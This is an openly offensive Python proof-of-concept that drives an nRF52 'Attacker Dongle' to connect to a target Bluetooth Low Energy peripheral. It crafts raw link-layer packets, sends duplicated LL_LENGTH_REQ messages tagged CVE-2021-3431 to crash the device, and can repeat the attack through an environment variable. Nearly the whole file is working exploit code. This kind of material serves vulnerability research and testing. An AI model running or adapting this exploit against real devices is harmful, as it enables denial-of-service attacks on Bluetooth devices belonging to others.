#!/usr/bin/env python3

import os
import platform
import sys
from time import sleep
from serial.tools import list_ports

def discover_attacker_dongle(dev_idx=0):
    ports = list_ports.comports()
    # Sort ports list
    ports.sort(key=lambda x: x.device)

    dev_peripheral = None
    idx_peripheral = 0

    for port in ports:
        # print(port.device + ' : ' + port.description)
        if 'Attacker Dongle' in port.description:
            print('Found' + str(port.description) + 'in ' + str(port.device))
            if idx_peripheral >= dev_idx:
                dev_peripheral = port.device
            idx_peripheral += 1

    return [dev_peripheral, idx_peripheral - 1]

# libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.utils import wrpcap
# timeout lib
from timeout_lib import start_timeout, disable_timeout, update_timeout

# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Internal vars
none_count = 0
end_connection = False
connecting = False
attack = True
slave_addr_type = 0
# Autoreset colors
colorama.init(autoreset=True)

attacker_serial_port = discover_attacker_dongle()
if None in attacker_serial_port:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)
else:
    serial_port = attacker_serial_port[0]

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 2:
    advertiser_address = sys.argv[1].lower()
else:
    advertiser_address = 'c8:c9:a3:d3:65:1e'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.lower())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.lower() +
          ' received\nThe device may have crashed!!!')
    disable_timeout('scan_timeout')


def scan_timeout():
    global slave_addr_type, connecting
    scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
        ScanA=master_address,
        AdvA=advertiser_address)
    driver.send(scan_req)
    # start_timeout('scan_timeout', 2, scan_timeout)
    connecting = False


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

# start_timeout('scan_timeout', 2, scan_timeout)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while(attack):
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
            # update_timeout('scan_timeout')
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and hasattr(pkt, 'AdvA') and pkt.AdvA == advertiser_address.lower() and \
                connecting == False:
            connecting = True
            # update_timeout('scan_timeout')
            # disable_timeout('crash_timeout')
            slave_addr_type = pkt.TxAdd
            print(Fore.GREEN + advertiser_address.lower() + ': ' + pkt.summary()[7:] + ' Detected')
            # Send connection request to advertiser
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms (any)
                chM=0x1FFFFFFFFF,  # Any
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            driver.send(conn_request)
        elif BTLE_DATA in pkt and connecting == True:
            connecting = False
            print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
            # Send version indication request
            pkt = pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
            driver.send(pkt)

        elif LL_VERSION_IND in pkt:
            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
            driver.send(pkt) #CVE-2021-3431
            driver.send(pkt)
            print(Fore.RED + 'Multiple LL_LENGTH_REQ packets sent')
            scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                ScanA=master_address,
                AdvA=advertiser_address)
            print(Fore.YELLOW + 'Connection reset')

            print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
            driver.send(scan_req)

            if 'CONTINUE_ATTACK' in os.environ:
                attack = True
            else:
                attack = False
            

    sleep(0.01)
